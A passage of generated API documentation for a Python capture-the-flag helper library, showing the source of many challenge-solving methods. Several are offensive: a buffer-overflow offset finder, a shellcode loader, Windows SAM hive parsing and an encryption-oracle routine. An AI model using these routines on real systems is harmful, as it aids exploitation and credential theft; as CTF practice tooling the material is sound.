\x8eZ\xd5p*-qC%\xec\x85aH\x90&gt;\xc1\x97%B@\x12B&#34;u\xd5R\x0f\x10`&amp;\x9ai\x1cl*F\xefOr\xaee\xaf\xa9\x88q\xa2k93\xe6\xf6\xf5\xa8n\xd0\xf42\xe5&lt;\xf7}\xad\xdc\xd4)L\x11\x97\xd4\x92\x11E\xe1\xa0\xa4\xe4{\x9a\xe6T\xda \xee\x83\xb7\xce\x17\xb0\xb3\x0c\x11\x8f\xc1t\x0c\xb5\x87\x9e\xbb\x0f\x0fql\xe8T\xc5\x02+E\xdd\xbcQ\x92\xb8\xb8\xc8*,(K\tUk\x16\t\x86\xb9@\&#39;\x04\xc1l&amp;\xcf)\x1f\x14V\x0b\x80\xd2\r\xab\xec\x07) \x0c\x0f\x80\xee\x16\x14\xf9\x9c\xcbKE\xed`;5\xa9\xc2\x105X[\x87\xd6j\x95\x18\xcaY\x99\xba\xe6\xe8\x04q\x8344\xceW\x00\x05\xc4\x15\xfb\x82\xea9\xfcJ\xa3L\x8e\n\xc1\xb4\xb3sY\x84`\x98\x99\xccy\x0f{\x02P\x8e\n\xb3\xe5\xeclN\xa8\xb5]\x84!I\x80\xa4\x8at&amp;\xe4eu\xba\x15T\x1fv\x90fx\x81P9\x1a\xf5G\xa9\xa2\x9c\xed\xc4W\xa0\xbb\xa5j\x1e\x1b\xd9%J\xb3z1I`\x19s\xd9\xb0\\\xca\xfdd\xd54!\x829\xc2|\x0c\xed\xdb\x0e\xde:\xcb%l-\xf6\x8f\xef\xde\xe2\xa5h\xb6e\xc5\xc7!\xc6 @B\x97.\xc2,~\xf8\x8a\x14\x94\xeb\x8emR\xf8\xfb\xa5&#34;Qd\xc0\xe6\x81\xbe\x9fc=s\xd6,V\xca\xb1\x80!U\x8c\x82&#34;\xddme\xbc=\xf9\x1b\xfc\x8d\xe6+\xc3\xc8:y\xe2\xfcZ\x1c\x88\x9f{\xdbZK\xb0#,\xb8\x9f\x10\xe1\x03\xb0H\x7f\x89w\xee\xd7\x9dvx\xafo\x98vge%\xdc&#34;\xd1\x0f\x9dQ?\x83N\xe3\xb4\x14j%|C\x08\xb0\x16K\xc1H\x9d\xf8\xbc\xf4\xae\xa7\x8aA\xd0\xbfCM\x85w\x82)c\xcc\xd4\xcaV\xc52j\x14ObB&amp;\xe7NQ\x9e\&#39;93M\x8f`!\xcc\x80#%\x04\xd2\xeb&#34;T\xbe\x8d0\x04\xa5\xad\xa3\xab\xf6\xd5\x86\xe214\xb1\xa6\x12\xa6*t\x94Q\x0c!\xc1\xe0#\x18\x8a\x81\xe4\x12A\xccK\xc6\xa3\xa9\xd0kh\xbb\x11m\xd7\\\xe6\xe8wr\x990\xc0\x83\x85\rC\x9d\xc8\xc7\xfcv\xf8Y/\x93\xc30NFe\xc2\xf7s\x91\xb7B\xa6\x10bb\x11\x18\xb0\x19\xf4\xa1X\xb9\x92\xb3\xdc+\x962\x9c\x0bt\xd9l,&amp;\xe8\x1f\x0b\xfe\xf4\xb7\xcd\x0e\x11\xc9#Z\xb0\x90d2]\x06\x89\xcd\t\\\xa3\t\xad\x8d\x9b\xe5Z\xd0\xa6\xa73q{&gt;_\xd7\xdd\xe21\x83\xa2k\x04DO\xc0Ag;Z\x99;\xdf\x14\x9e&lt;\xe3v\x1d\x99\x8b\x9a\x98d\xe6\x05\xcd)\x94\xc2\x9b:F \xcdG\xdeP\x869\xdd)kg\xd2\xde*\x1a\x9c\x04\x10\x12z\xda4\x8d,\xcb\xec\xcbR\x99\x0f\x9c\x81\x08\xearz\xe5R\x17\&#39;Y.=\x9el\xe9\xc4\xeew0\x08\x06\xc0g/m\xe0\xf04\x1c\x0c\xfcN\xc0Q\xaa\xbf\xc5\xe8\xa0y5\x88\x83\xdet\xa3\xce!e&#34;\\\x13F\xeeo\xf7]\xcd\xa0t\x01F[h\xad\xa0a\xd7\x02\xda5\xcdo\xa9&gt;\xf0\x88P\x9dM\xb3A\xc8\x92\xd6\x8b\x1b.\x8b\x8f\x9b\x8c\xda\x9cQ\xa1o\x14\xeb\&#39;\xeb\x9f?\xf1\xd5\x87P\x0c\xb6g*\x1bqX\x93P=@\x1c\x0b\xab\xec\t\x1dq\xa9\x94\x16\x10u\x0ez\xc7\x9eG*\x12\x06K\xf5\xb8\x1ca\xe7 \x1a\xf0\xb5\xa8\x879\x86\x18\xe2\xb0\x96\xc1]~`ac[\xc2\xde\x83\xa5G2@[2\x96\xc5f\x7f\x17\xa7\n\x1b\x9cU\x06\x07;`\x96\xa31\t\xe8\x94t\xc0\xbdzW\xaeW\xb3^\xf4\x9e\xf6\x834\x0c\xb2&#34;\x8e\x94\xda\xafp\xa4%N\x93\x045C\xa1`A\x02\xc1-h\x80\x8d\xb6\xc9d\xc5\xde\x98-\xa2\xbf\xafB\x8c\xd2\x9a\xbe\x98,\xc4\xfd\x93(V\xd1j\xd3\x1cA\xb5\xae\x7f\xae\x8e\x9c\xb0)\x8b5\x96\x0c\xffR\x9e\r\t\xae24\xf6\xf6\xfb\x85=\xc7\x8dd\xc8O1\xcb\xce\xb2*\x98\x1d\xb5LW\xaft\xcb\xcb\xbe)\xfc\xc0L\xacJ\x03\x95\x1b\x85\x94\xd0^\xe2uv/\x00\x10\r\&#39;\x1e\xc7\xb5\xfd\xe7\xe6\xaf\x03\xa6\&#39;\x88U\xab\xd9\xa85\x8a\xca\xd4\x84o\xb0\x83\xc4\xb9\x1a\xf4\x8c\xc0\xb9T\xae\x86\xa2cP[\x80D\x1a\x91z\xca\xb0\x83`4\x84\x8aM\&#39;;r\x91d%\x99\x89\xa7\x10Xp\xc8\x96\\\x82[\xe8\x9b\x01\xc0\xdd\x07\r\x10\xc7\x85\x83R\x04Tc\x1e\x99&lt;)\xc9\x98`\x16\x9c\x82bl\xac\xa9I\xedh+P\xcc\xa7l\xb17\x97S\x1b\x83W\xbe\xa5|\x083ZJ\x80\xec\xcfm\xc8\xd9\x8b\x1a!\xbf\x0c\x14\x12&lt;{f\xa2\xa0\x05u\xb2\xf9\xf2\x9a\xde\x95r\xa0\xf5&gt;&#34;\&#39;\xe9\xe8\xae\x12\x1a\x12\x92Q\x11\x91\xa8&#34;\xe2\xbf0\xb2\xe5Z\x88D\xe6\x01\x88#\xd3\xaa\xabV}\xbd\xd6Kh\x1aOG\x96*\xa0\xd7\xad\xd8\\h\xc3U\x80\x7f\xa0\xb3\x04\x86\x0f\xa4\xb2\xb5\xfb*VV\xa5\xab\xc5 \xba(U*\x1e8\xa7\xa1R\x17\xb5H\xcbh\xf8\x1d}\xf5I\xa7UY\xca8#\xf6k!&amp;|&gt;\x13(&lt;\xb3\xcf;#\x8b\x11\x8e\x9f\x07I\x03 \x13\xf8\xde:\xceW\xc0,V\xc0X@\xd0\x02\x04bT+\xc3\xd0\x14uu\xeb\xbbE\xa4X\xef\xed\x1c(\x9a\xcc\xf9n+\xf0\xe0f\x9fv/v6\xed\xd2\xc6/\xca^\xd0\x8bt\xe9&amp;\xdc\t\x93\x80\x8a\xa4F\xa6xn`\xb7\x9d\x86\xc7c\xa0Y1\xe6\x89\x92\x08h\x8b\xf8)8?\x13\n\xe6&lt;\xd8\xea5\xec\x80\x01b\xc6\\\xbe\x90\x07\xc8.a\xca\xca\x91\xd8hQ\xb1\xc4\xf9\xf2\x1a\x95\x8c\xe1h0\r+\xb0:\xd4\x02$!PC\x83P\xe4L\x99\xb9\x16q\xd4\xa1\x98\rJ0\x97\xd7\xdb3|\x80\x81\xe8\xe1.\x00@\xa8\xca\xc7\xd5\xfcK\xc9\xaa\xc6\xec\xc7\x97\xbc\x99\xb6m\xf1\x87\x9aM\xbdO\xd3?\xbc\x97\x93\xaflr\x9c=\x8f\xce\xfe\xd4*\x03\x92?*T\x18&lt;\x85\xc2+\x04\xc3@\x04\xf5\xf3\xc0ji#\xe4p\x18\xb5\xcd\x1f`b\x83\x99\xa3\xfc\x00?\x8fK\xbc\xa6g\xd9\x00\xd2v\xdf\x97+\xd3\x961\xa8zm\xe5\x9bP\x04\xf2L&amp;? \xc0`\xb4\x00\xca\xf0a\xbe9C\x80b\x87E\x83\xceh\xf93t}[\x1f\x9a&amp;\xfa\x0c\x1a`\xe5\xcc?e\xdb\x06\xe3&lt;\xf7IGH\x9c]%hp\xec?$\x19\xb9O\xd1)\xb9\xb2\x0c\xb7\x03ZGX\xe3\x92\x08\xd2\xc9VBp,\xb7\xec\x943\x8a\xd2\x1f5A@HQ\x9d \x80\xa3p8\xf1\xa2M\x07|\x95n\xe3\x92k\xf9\xb5\xd0 \xa7\xc0\x85/\xfcC]\x04&lt;\xd5\n5\x87\x11\x17\xe4o@\x9b*\xc0\n\xc3NkOh\xf8n \nj?\x9f=\xf5}\x06\x15h\x977A]\x0b\xb8\x94\xbe\xb0\xd7\xbe\xba\x8e\xb7\xafn\xa6\x9f#\x08?5\xde\xddm?\xec\xc6\xaa3\xd6jV\x0b.\xeam\xab\x94`\x95O\x13\x188\xc6\xc8I$9\x83\x7fil\xf2\xf9\x17\x19h\x93*\xbfk\xb2\xea#\xad\xbf\xcb\xe5{C\x15\xcef^\xca\x88\x99Wya\xac\x8c\xdb\x11\x16\xd9\x07\x05y\xe5C\xb4,\xc2\xc3\xcdP\xd2\xec\xe4\xceT$\xaa*\xa1&amp;[[\x8d\xb7\xc5\x9b\xc3C\xba)_F\xba\xbd\xac&lt;N7)g\x9f\xc1\xd8p\xab\&#39;\xd9#K\x966z\xfc\x9d\xeb\xd7w\xb7\xd0\x89\xa4\xb9 \x88\x88\x846\xb5\xa1\x84J\xce\xa2\x0b\xe877\xf7\xf3\x17\x0c\xd3\xd0)\xe3\x07\xdcvm\xa0#\x96\xffx\xaa\xe6E_\x07aO\xefj\xba\xe3c\x9b\xdel$\x83h\x9e\tL\x1f\xa0}%&#34;p\x9c\xd4\xd1\x9e\x8e\xfdf]\t\xac#\xbf\x15\x9c&lt;\xf3-\xc2Zj\x99\xae\xc8.\xb3\x9d5\xfa\xe2\xae\xea\xba\xf4\xc63\x04Ot\xf9\x12\xd1{nMJB\x1b,\xbc\xbek\xa0\xca\xa6\xa5\x93/\x0f\xa1)Y\xb4v2L3\xa5\x8d\x0cq(\x0f\x18\x10\x82P-&#34;\xe5\xe1\xe8\xb3\xa3SxJ\xcc\x0c\xdc\xae-n\xf7}w\x19\xae.\xcbi\\b\xdf0[\x10\xe9\x1a2xVZK\xd0S\x88\xd2c&amp;+\xf7\x83Oj\x9d\xab\xb7Uh&#34;z\x97\xf0\x9d\xa7\x92\xd6[(w\x0e)\xc8\xffM|\xa3j\xa15\xc7\x04\xe4Z\xd8\xa2\x88\x08\r\xea\x90J\xbaM\x01\xb0\xd2uQ\xc0\xa1\xcd\\\xadV\xe2\xf3.\x0bl\xe8\xa9^$\xc9\x95\xf6T\x13W\x18\x824\x016\xc8%,\x08\xbe\n\xa2\xd5AB\xdd5[=m7:\x06\xa0\x80\x86\x04\xb5\xe5E\x83K&gt;qyY\x94S\xb8\xd80\xd6[\xc2\x84k\x0b\xdb\xec\x15\xb6\xcf-\&#39;\xf0e@f\xa9Q6U\xcbi\x13N\xbas]3Q\xb1\x8diFP\xbb!P\xff\xd2\x82n\x98\x9dH^\xd6k\xd3\x8e%\xe0k\xca\x9b\xd4\xff\x90\xba-Q\x15\xa5\xd3\x14O\xe0\x12\x06]&#34;\xb2\xa8\x82\xac`\&#39;L\x98\xbd\xbcb;\xad\x13T\x95\x15o\x1a!\x89\xc3\xadN|z\x9bv\xf9\x98\x14\xca\xff\xe2\xeeH\xa7\n\x12\x11\xa5N\xe0\x00&#39;</code></pre>
</details>
<div class="desc"><h2 id="description">Description</h2>
<p>Challenge specific function to load the compressed data</p></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.load_lyrics"><code class="name flex">
<span>def <span class="ident">load_lyrics</span></span>(<span>self)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def load_lyrics(self):

    files = [
        &#34;lyrics_partial.txt&#34;,
        &#34;lyrics.txt&#34;,
        &#34;greek_lyrics.txt&#34;,
        &#34;genius_lyrics.txt&#34;,
    ]

    with open(self.folfil(&#34;data&#34;, files[1]), &#34;r&#34;) as f:
        lyrics = f.read().strip()
    return lyrics</code></pre>
</details>
<div class="desc"></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.load_master_key"><code class="name flex">
<span>def <span class="ident">load_master_key</span></span>(<span>self)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def load_master_key(self):
    with open(self.Path(self.folder_files, &#34;mkey.json&#34;), &#34;r&#34;) as mkey_file:
        mkey_data = json.load(mkey_file)
    master_key_id = list(mkey_data[&#34;masterkeys&#34;].keys())[0]
    master_key = bytes.fromhex(mkey_data[&#34;masterkeys&#34;][master_key_id])
    return master_key</code></pre>
</details>
<div class="desc"></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.load_shellcode"><code class="name flex">
<span>def <span class="ident">load_shellcode</span></span>(<span>self)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def load_shellcode(self):
    shellcode = &#34;&#34;
    exploit_filed = self.folfil(folder=&#34;payloads&#34;, file=&#34;exploit.asm&#34;)
    with open(exploit_filed, &#34;r&#34;) as f:
        shellcode = f.read()

    shellcode = self.pwn.asm(shellcode)
    print(shellcode)

    return shellcode</code></pre>
</details>
<div class="desc"></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.local_evtx_analysis"><code class="name flex">
<span>def <span class="ident">local_evtx_analysis</span></span>(<span>self, file)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def local_evtx_analysis(self, file):
    with evtx.Evtx(file) as log_file:
        self.saving_xml(log_file, file, display=False)</code></pre>
</details>
<div class="desc"></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.local_exploitation"><code class="name flex">
<span>def <span class="ident">local_exploitation</span></span>(<span>self)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def local_exploitation(self):
    &#34;&#34;&#34;
    Performs local exploitation to find the offset.

    Returns:
        int: The offset found from the local exploitation.
    &#34;&#34;&#34;
    local = CTFSolver(conn=&#34;local&#34;, file=self.file, url=self.url, port=self.port)
    local.initiate_connection()

    # Header
    local.recv_lines(number=19, display=False)
    # Two sentence message
    local.recv_lines(number=2, display=False)

    payload = self.generate_pattern(length=300)
    print(f&#34;Pattern: {payload}&#34;)

    # Sending payload
    local.send(payload, encode=False)

    output = local.recv_lines(number=2, save=True)

    rpb = str(output[0]).replace(&#34;\\n&#34;, &#34;&#34;).split(&#34;==&#34;)[1].strip().strip(&#34;&#39;&#34;)
    print(rpb)
    crash_value = int(rpb, 16)
    offset = self.find_offset(crash_value)
    print(f&#34;Offset: {offset}&#34;)
    return offset</code></pre>
</details>
<div class="desc"><p>Performs local exploitation to find the offset.</p>
<h2 id="returns">Returns</h2>
<dl>
<dt><code>int</code></dt>
<dd>The offset found from the local exploitation.</dd>
</dl></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.local_preparations"><code class="name flex">
<span>def <span class="ident">local_preparations</span></span>(<span>self)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def local_preparations(self):
    if self.conn == &#34;remote&#34;:
        return
    self.challenge_file = self.Path(self.parent, &#34;challenge&#34;, self.file)
    self.folder_challenge = self.Path(self.parent, &#34;challenge&#34;)
    self.prepare_space(
        files=[&#34;flag.txt&#34;],
        folder=self.folder_challenge,
    )</code></pre>
</details>
<div class="desc"></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.local_run"><code class="name flex">
<span>def <span class="ident">local_run</span></span>(<span>self)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def local_run(self):
    data = &#34;0x9cc74100x804b0000x80489c30xf7ec6d800xffffffff0x10x9cc51600xf7ed41100xf7ec6dc7(nil)0x9cc61800x10x9cc73f00x9cc74100x6f6369700x7b4654430x306c5f490x345f74350x6d5f6c6c0x306d5f790x5f79336e0x633432610x366134310xff87007d&#34;
    return data</code></pre>
</details>
<div class="desc"></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.local_searching_file"><code class="name flex">
<span>def <span class="ident">local_searching_file</span></span>(<span>self, file, *args, **kwargs)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def local_searching_file(self, file, *args, **kwargs):
    return self.search_for_base64(file, *args, **kwargs)</code></pre>
</details>
<div class="desc"></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.look_all_subkeys"><code class="name flex">
<span>def <span class="ident">look_all_subkeys</span></span>(<span>self)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def look_all_subkeys(self):
    # Unused
    security_answers = []
    users_base = r&#34;\SAM\Domains\Account\Users&#34;
    users_key = self.hive.get_key(users_base)

    for subkey in users_key.iter_subkeys():

        # for subkey in users_key.subkeys_list:
        if subkey.name == &#34;Names&#34;:
            continue  # Skip the Names key

        try:

            print(subkey.name, subkey.values_count, list(subkey.iter_values()))
            v_value = subkey.get_value(&#34;V&#34;)
            # print(f&#34;Value for {subkey.name}: {v_value}&#34;)
            decoded = self._decode_v_value(v_value)
            if decoded:
                security_answers.extend(decoded)
        except Exception as e:
            print(e)
            continue

    print(security_answers)
    # Only keep unique and plausible answers (e.g. non-binary junk)
    cleaned = [a for a in security_answers if a and a.isprintable()]
    cleaned = list(dict.fromkeys(cleaned))  # remove duplicates

    return
    # Format answer according to challenge
    result = f&#34;ECSC{{{&#39;:&#39;.join(cleaned[:3])}}}&#34;
    print(result)
    self.flag = result</code></pre>
</details>
<div class="desc"></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.looper"><code class="name flex">
<span>def <span class="ident">looper</span></span>(<span>self)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def looper(self):
    payload = &#34;-1-1-2-3-4-5-6-7-8-9-10-11-12-13-14-15-16-17-1813-14-15-16-17-18---1&#34;
    payload = &#34;-1-1-1111111111111--11111111111111&#34;

    times = 110
    for i in range(times):
        self.send_menu(payload)
        self.recv_lines(1, display=True)
    # self.recv_lines(10, display=True)
    # self.recv_lines(1, display=True)

    # # acc = self.recv_lines(1, save=True)[0]
    # # print(acc)

    # self.send_menu(&#34;1--1&#34;)

    self.recv_lines(times, display=True)</code></pre>
</details>
<div class="desc"></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.lyric_transformation"><code class="name flex">
<span>def <span class="ident">lyric_transformation</span></span>(<span>self, lyrics)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def lyric_transformation(self, lyrics):

    punctuation_used = set()
    for c in lyrics:
        if c not in ascii_letters + digits + &#34; &#34;:
            punctuation_used.add(c)

    lyrics_only_letters = &#34;&#34;.join([c for c in lyrics if c.isalnum()])
    lyrics_with_spaces = lyrics.replace(&#34;\n&#34;, &#34; &#34;)
    lyrics_without_punctuation = lyrics_with_spaces.replace(&#34;&#39;&#34;, &#34;&#34;).replace(
        &#34;,&#34;, &#34;&#34;
    )
    return lyrics_only_letters, lyrics_with_spaces, lyrics_without_punctuation</code></pre>
</details>
<div class="desc"></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.lyric_transpose"><code class="name flex">
<span>def <span class="ident">lyric_transpose</span></span>(<span>self, lyrics, offset, wrap=True)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def lyric_transpose(self, lyrics, offset, wrap=True):
    if offset &gt; len(lyrics):
        offset = offset % len(lyrics)

    result = lyrics[offset:]
    if wrap:
        result += lyrics[:offset]

    return result</code></pre>
</details>
<div class="desc"></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.lyrics_all"><code class="name flex">
<span>def <span class="ident">lyrics_all</span></span>(<span>self)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def lyrics_all(self):
    &#34;&#34;&#34;
    Description:
        This function generates all possible combinations of lyrics transformations
        based on the provided replace_combos and control_combos.
        It uses itertools.product to create combinations of the specified number
        of transformations, allowing for flexible lyric manipulation.
    Returns:
        list: A list of transformed lyrics combinations.
    &#34;&#34;&#34;
    lyrics = self.load_lyrics()
    control_combos = self.creating_control_combos(
        start=0, end=1, number=len(self.replace_combos)
    )
    return [
        self.lyrics_transformation(lyrics, self.replace_combos, control)
        for control in control_combos
    ]</code></pre>
</details>
<div class="desc"><h2 id="description">Description</h2>
<p>This function generates all possible combinations of lyrics transformations
based on the provided replace_combos and control_combos.
It uses itertools.product to create combinations of the specified number
of transformations, allowing for flexible lyric manipulation.</p>
<h2 id="returns">Returns</h2>
<dl>
<dt><code>list</code></dt>
<dd>A list of transformed lyrics combinations.</dd>
</dl></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.lyrics_transformation"><code class="name flex">
<span>def <span class="ident">lyrics_transformation</span></span>(<span>self, lyrics, replace_combos, control_combos=None)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def lyrics_transformation(self, lyrics, replace_combos, control_combos=None):
    if control_combos is None:
        return lyrics

    for control, combo in zip(control_combos, replace_combos):
        if control:
            if len(combo[0]) &gt; 1:
                lyrics = lyrics.replace(*combo[0]).replace(*combo[1])
            else:
                lyrics = lyrics.replace(*combo)
    return lyrics</code></pre>
</details>
<div class="desc"></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.main_multi_process"><code class="name flex">
<span>def <span class="ident">main_multi_process</span></span>(<span>self)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def main_multi_process(self):

    # 50 unique 8-byte blocks
    self.plaintexts = [bytes([i]) * 8 for i in range(49)]
    self.pairs = []

    self.initiate_connection()
    self.recv_lines(3)

    self.menu_handler(verbose=True)

    found_key = None
    # Needs the logic here

    # Encrypt the magic phrase
    magic_pt = b&#34;Give me the flag&#34;
    key = des.DesKey(found_key)
    magic_ct = key.encrypt(magic_pt)
    print(&#34;Magic ciphertext:&#34;, magic_ct.hex())

    self.recv_send(text=&#34;2&#34;, text_until=&#34;&gt; &#34;)
    self.recv_send(text=magic_ct.hex(), text_until=&#34;Provide the magic phrase &gt; &#34;)
    flag = self.recv_lines(3, display=True, save=True)[0]</code></pre>
</details>
<div class="desc"></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.md5_hash"><code class="name flex">
<span>def <span class="ident">md5_hash</span></span>(<span>self, s)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def md5_hash(self, s):
    return md5(s.encode()).hexdigest()</code></pre>
</details>
<div class="desc"></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.menu_handler"><code class="name flex">
<span>def <span class="ident">menu_handler</span></span>(<span>self, verbose=False)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def menu_handler(self, verbose=False):
    for pt in self.plaintexts:
        ct = self.oracle_encrypt(pt.hex())
        if verbose:
            print(f&#34;Encrypting plaintext: {pt.hex()} - ciphertext: {ct.hex()}&#34;)
        self.pairs.append((pt, ct))</code></pre>
</details>
<div class="desc"></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.modify_picture"><code class="name flex">
<span>def <span class="ident">modify_picture</span></span>(<span>self)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def modify_picture(self):
    image = Image.open(self.challenge_file.as_posix())

    exif_dict = piexif.load(image.info.get(&#34;exif&#34;, b&#34;&#34;))
    # exif_dict = piexif.load(self.challenge_file)
    exif_bytes = piexif.dump(exif_dict)

    for k, v in exif_dict.items():
        print(k, v)</code></pre>
</details>
<div class="desc"></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.music21_analysis"><code class="name flex">
<span>def <span class="ident">music21_analysis</span></span>(<span>self)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def music21_analysis(self):
    # midi_file_path = &#34;/mnt/data/flag.midi&#34;
    midi = converter.parse(self.challenge_file)

    # Analyze structure and extract textual representation
    notes_data = []
    for element in midi.flatten():
        # print(element)
        notes_data.append(str(element))
        # if isinstance(element, note.Note):
        #     notes_data.append(str(element.pitch))
        # elif isinstance(element, chord.Chord):
        #     notes_data.append(&#34;.&#34;.join(str(n) for n in element.normalOrder))

    # Show first 50 note/chord representations
    with open(self.folfil(&#34;data&#34;, &#34;analysis_music_21.json&#34;), &#34;w&#34;) as f:
        import json

        json.dump(notes_data, f, indent=4)
    print(notes_data)</code></pre>
</details>
<div class="desc"></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.music21_note_analysis"><code class="name flex">
<span>def <span class="ident">music21_note_analysis</span></span>(<span>self)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def music21_note_analysis(self):
    # Analyze structure and extract textual representation
    notes_data = []
    for element in self.midi.flatten():
        # print(element)
        notes_data.append(str(element))
        # if isinstance(element, note.Note):
        #     notes_data.append(str(element.pitch))
        # elif isinstance(element, chord.Chord):
        #     notes_data.append(&#34;.&#34;.join(str(n) for n in element.normalOrder))

    return

    analysis = []

    for i, element in enumerate(notes_data):
        split_element = element.split(&#34; &#34;)
        if &#34;.&#34; in split_element[0]:
            analysis.append(
                {
                    &#34;sort&#34;: i,
                    &#34;type&#34;: split_element[0].split(&#34;.&#34;)[1],
                    &#34;value&#34;: &#34; &#34;.join(split_element[1:]),
                }
            )
        else:
            analysis.append({&#34;sort&#34;: i, &#34;type&#34;: &#34;generic&#34;, &#34;value&#34;: element})

    with open(self.folfil(&#34;data&#34;, &#34;analysis_music_21.json&#34;), &#34;w&#34;) as f:
        import json

        json.dump(analysis, f, indent=4)</code></pre>
</details>
<div class="desc"></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.mutate_key"><code class="name flex">
<span>def <span class="ident">mutate_key</span></span>(<span>self, buf:bytearray, key:bytes) >bytearray</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def mutate_key(self, buf: bytearray, key: bytes) -&gt; bytearray:
    tmp = buf[:]
    for i in range(0, len(key), 5):
        chunk = key[i : i + 5]
        tmp = self.xor_decrypt(tmp, chunk)
    return tmp</code></pre>
</details>
<div class="desc"></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.nrzi_formater"><code class="name flex">
<span>def <span class="ident">nrzi_formater</span></span>(<span>self, bits:list)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def nrzi_formater(self, bits: list):
    bits = [0] * (len(bits) % 8) + bits
    return bits</code></pre>
</details>
<div class="desc"></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.nrzi_formater_for_rest"><code class="name flex">
<span>def <span class="ident">nrzi_formater_for_rest</span></span>(<span>self, bits:list)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def nrzi_formater_for_rest(self, bits: list):
    # padded_length = math.ceil(len(bits) / 8) * 8
    last_bits = len(bits) % 8
    if last_bits == 0:
        return bits

    valid_bits = bits[: len(bits) - last_bits]
    rest_of_bits = bits[len(bits) - last_bits :]
    print(
        f&#34;Valid bits: {valid_bits}, Rest of bits: {rest_of_bits}, Last bits: {last_bits}&#34;
    )
    rest_of_bits = [0] * (8 - last_bits) + rest_of_bits
    # Pad with zeros to make it a multiple of 8
    print(f&#34;Rest of bits: {rest_of_bits}&#34;)

    return valid_bits + rest_of_bits</code></pre>
</details>
<div class="desc"></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.nrzi_to_ascii"><code class="name flex">
<span>def <span class="ident">nrzi_to_ascii</span></span>(<span>self, bits)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def nrzi_to_ascii(self, bits):
    grouped_bits = [bits[i : i + 8] for i in range(0, len(bits), 8)]
    ascii_chars = []
    for group in grouped_bits:
        value = int(&#34;&#34;.join(map(str, group)), 2)
        ascii_chars.append(chr(value))
    return &#34;&#34;.join(ascii_chars)</code></pre>
</details>
<div class="desc"></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.open_file"><code class="name flex">
<span>def <span class="ident">open_file</span></span>(<span>self)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
<pre><code class="python">def open_file(self):
    with open(self.challenge_file, &#34;r&#34;) as f:
        data = f.read().split(&#34;\n&#34;)
        n = int(data[0].split(&#34;= &#34;)[1])
        enc_flag = data[1].split(&#34;= &#34;)[1]
        c = data[2].split(&#34;= &#34;)[1]
    return n, enc_flag, c</code></pre>
</details>
<div class="desc"></div>
</dd>
<dt id="ctfsolver.find_usage.gathering.Gathering.oracle_encrypt"><code class="name flex">
<span>def <span class="ident">oracle_encrypt</span></span>(<span>self, pt_hex)</span>
</code></dt>
<dd>
<details class="source">
<summary>
<span>Expand source code</span>
</summary>
